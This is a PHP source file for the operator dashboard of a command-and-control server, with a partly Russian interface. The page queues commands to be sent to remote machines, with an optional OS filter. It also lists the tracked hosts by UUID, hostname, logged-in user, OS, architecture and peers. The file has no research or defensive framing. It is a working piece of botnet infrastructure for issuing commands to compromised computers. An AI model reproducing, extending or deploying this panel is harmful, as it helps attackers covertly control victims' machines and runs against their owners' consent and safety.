<?php
declare(strict_types=1);
header('Content-Type: text/html; charset=utf-8');
$config = require __DIR__ . '/config.php';
$dbHost     = $config['db']['host'];
$dbName     = $config['db']['name'];
$dbUser     = $config['db']['user'];
$dbPassword = $config['db']['pass'];

require_once __DIR__ . '/db.php';
try {
    $db = new C2Database($dbHost, $dbName, $dbUser, $dbPassword);
} catch (PDOException $e) {
    die('DB connection error: ' . htmlspecialchars($e->getMessage()));
}

$message = $error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command  = trim($_POST['command']  ?? '');
    $osFilter = trim($_POST['os_filter'] ?? '') ?: null;

    if ($command === '') {
        $error = 'Введите текст команды.';
    } else {
        $db->addCommand($command, $osFilter);
        $message = 'Команда успешно добавлена.';
    }
}

$hosts    = $db->listHosts();
$commands = $db->listCommands();
?>
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>C2 Dashboard</title>
  <link rel="stylesheet" href="st.css">
</head>
<body>
  <div class="container">
    <h1>C2</h1>

    <?php if($message): ?>
      <div class="message success"><?= htmlspecialchars($message) ?></div>
    <?php endif; ?>
    <?php if($error): ?>
      <div class="message error"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <section>
      <h2>New command</h2>
      <form method="post" class="cmd-form">
        <label>
          Com
          <input type="text" name="command" required>
        </label>
        <label>
          OS
          <input type="text" name="os_filter" placeholder="например, linux">
        </label>
        <button type="submit">Добавить</button>
      </form>
    </section>

    <section>
      <h2>Host list</h2>
      <table>
        <thead>
          <tr>
            <th>UUID</th>
            <th>Hostname</th>
            <th>User</th>
            <th>OS</th>
            <th>Arch</th>
            <th>Peers</th>
            <th>Updated</th>
          </tr>
        </thead>
        <tbody>
        <?php foreach($hosts as $h): ?>
          <tr>
            <td><?= htmlspecialchars($h['uuid']) ?></td>
            <td><?= htmlspecialchars($h['hostname']) ?></td>
            <td><?= htmlspecialchars($h['username']) ?></td>
            <td><?= htmlspecialchars($h['os']) ?></td>
            <td><?= htmlspecialchars($h['arch']) ?></td>
            <td><?= htmlspecialchars(is_array($h['peers']) ? implode(', ', $h['peers']) : '') ?></td>
            <td><?= htmlspecialchars($h['ts']) ?></td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table>
    </section>

    <section>
      <h2>Command list</h2>
      <table>
        <thead>
          <tr>
            <th>ID</th>
            <th>Com</th>
            <th>OS Filter</th>
            <th>Created</th>
          </tr>
        </thead>
        <tbody>
        <?php foreach($commands as $c): ?>
          <tr>
            <td><?= htmlspecialchars($c['id']) ?></td>
            <td><?= htmlspecialchars($c['command_text']) ?></td>
            <td><?= htmlspecialchars($c['os_filter']) ?></td>
            <td><?= htmlspecialchars($c['created_at']) ?></td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table>
    </section>
  </div>
</body>
</html>
